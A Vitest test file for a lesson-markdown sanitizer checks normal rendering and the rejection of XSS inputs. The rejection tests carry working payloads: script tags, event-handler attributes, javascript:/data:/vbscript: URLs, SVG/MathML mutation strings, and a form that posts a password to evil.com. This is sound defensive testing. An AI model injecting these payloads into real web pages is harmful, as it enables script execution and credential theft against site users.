import { describe, it, expect } from "vitest";
import { sanitizeLessonMarkdown } from "./markdown-sanitizer";

describe("markdown-sanitizer (Security & XSS Mitigation - AC-011)", () => {
  describe("Standard Educational Markdown Rendering", () => {
    it("renders headings shifted down by 1 (DEF-021-02), paragraphs, lists, bold, and italics cleanly", () => {
      const markdown = `
# Lesson Header
This is a standard educational paragraph with **bold** and *italic* text.

- Key point 1
- Key point 2
      `.trim();

      const output = sanitizeLessonMarkdown(markdown);
      // DEF-021-02: # Heading becomes <h2>
      expect(output).toContain("<h2>Lesson Header</h2>");
      expect(output).not.toContain("<h1>");
      expect(output).toContain("<p>This is a standard educational paragraph");
      expect(output).toContain("<strong>bold</strong>");
      expect(output).toContain("<em>italic</em>");
      expect(output).toContain("<ul>");
      expect(output).toContain("<li>Key point 1</li>");
    });

    it("shifts and clamps Markdown heading levels correctly (DEF-021-02)", () => {
      const markdown = `
# Heading 1
## Heading 2
### Heading 3
#### Heading 4
##### Heading 5
###### Heading 6
      `.trim();

      const output = sanitizeLessonMarkdown(markdown);
      expect(output).toContain("<h2>Heading 1</h2>");
      expect(output).toContain("<h3>Heading 2</h3>");
      expect(output).toContain("<h4>Heading 3</h4>");
      expect(output).toContain("<h5>Heading 4</h5>");
      expect(output).toContain("<h6>Heading 5</h6>");
      expect(output).toContain("<h6>Heading 6</h6>");
      // Must NEVER contain h1
      expect(output).not.toContain("<h1>");
      expect(output).not.toContain("</h1>");
    });

    it("renders code blocks and tables properly", () => {
      const markdown = `
\`\`\`typescript
const rate = 0.05;
\`\`\`

| Asset | Risk |
| --- | --- |
| Bonds | Low |
| Stocks | Medium |
      `.trim();

      const output = sanitizeLessonMarkdown(markdown);
      expect(output).toContain("<pre>");
      expect(output).toContain("<code>");
      expect(output).toContain("<table>");
      expect(output).toContain("<th>Asset</th>");
      expect(output).toContain("<td>Bonds</td>");
    });

    it("enforces rel='noopener noreferrer' on external hyperlinks", () => {
      const markdown = `Learn more at [Financial Times](https://ft.com).`;
      const output = sanitizeLessonMarkdown(markdown);
      expect(output).toContain('<a href="https://ft.com" target="_blank" rel="noopener noreferrer">');
    });

    it("returns empty string for null, undefined, or empty inputs", () => {
      expect(sanitizeLessonMarkdown(null)).toBe("");
      expect(sanitizeLessonMarkdown(undefined)).toBe("");
      expect(sanitizeLessonMarkdown("")).toBe("");
    });
  });

  describe("XSS Attack-Vector Rejection Tests (Concrete Payloads)", () => {
    it("neutralizes <script> tags", () => {
      const payload = `# Welcome\n<script>alert("XSS")</script>\nLearn investing.`;
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("<script>");
      expect(output).not.toContain("alert(");
    });

    it("neutralizes inline event handlers (onload, onerror, onclick, onmouseover)", () => {
      const payload = `
<img src="invalid.jpg" onerror="alert('pwned')" />
<b onmouseover="alert('hover')">Hover me</b>
<button onclick="alert('click')">Click</button>
      `.trim();
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("onerror");
      expect(output).not.toContain("onmouseover");
      expect(output).not.toContain("onclick");
      expect(output).not.toContain("alert(");
      expect(output).not.toContain("<button");
    });

    it("neutralizes javascript: URLs in raw HTML links", () => {
      const payload = `<a href="javascript:alert('XSS')">Claim Reward</a>`;
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("javascript:");
      expect(output).not.toContain("alert('XSS')");
    });

    it("neutralizes javascript: URLs in Markdown links", () => {
      const payload = `Click [here](javascript:alert('XSS')) for free tokens.`;
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("javascript:");
      expect(output).not.toContain("alert('XSS')");
    });

    it("neutralizes data: URLs in links", () => {
      const payload = `[Malicious](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)`;
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("data:text/html");
      expect(output).not.toContain("PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==");
    });

    it("neutralizes vbscript: URLs in links", () => {
      const payload = `[VBScript](vbscript:msgbox(1))`;
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("vbscript:");
    });

    it("strips <iframe> tags completely", () => {
      const payload = `<iframe src="https://attacker.example.com/phish"></iframe>`;
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("<iframe");
      expect(output).not.toContain("attacker.example.com");
    });

    it("strips <form> and <input> elements", () => {
      const payload = `
<form action="https://evil.com/steal" method="POST">
  <input type="text" name="password" value="secret" />
</form>
      `.trim();
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("<form");
      expect(output).not.toContain("<input");
    });

    it("neutralizes <style> injection and CSS attack vectors", () => {
      const payload = `
<style>
  body { display: none !important; }
</style>
<div style="background-image: url(javascript:alert(1))">Content</div>
      `.trim();
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("<style>");
      expect(output).not.toContain("display: none");
      expect(output).not.toContain("style=");
    });

    it("neutralizes svg and math attack vectors", () => {
      const payload = `
<svg onload="alert('svg-xss')"><circle r="10"/></svg>
<math><mtext><table><mglyph><style><!--</style><img src="x" onerror="alert('math-xss')">
      `.trim();
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("<svg");
      expect(output).not.toContain("<math");
      expect(output).not.toContain("onload");
      expect(output).not.toContain("onerror");
      expect(output).not.toContain("alert(");
    });

    it("neutralizes malformed and nested HTML tags", () => {
      const payload = `<<SCRIPT>alert("XSS");//<</SCRIPT>`;
      const output = sanitizeLessonMarkdown(payload);
      expect(output.toLowerCase()).not.toContain("<script");
      expect(output.toLowerCase()).not.toContain("</script");
    });

    it("neutralizes raw HTML h1 attempts completely (DEF-021-02)", () => {
      const payload = `<h1>Malicious Secondary H1</h1>`;
      const output = sanitizeLessonMarkdown(payload);
      expect(output).not.toContain("<h1");
      expect(output).not.toContain("</h1>");
    });
  });
});

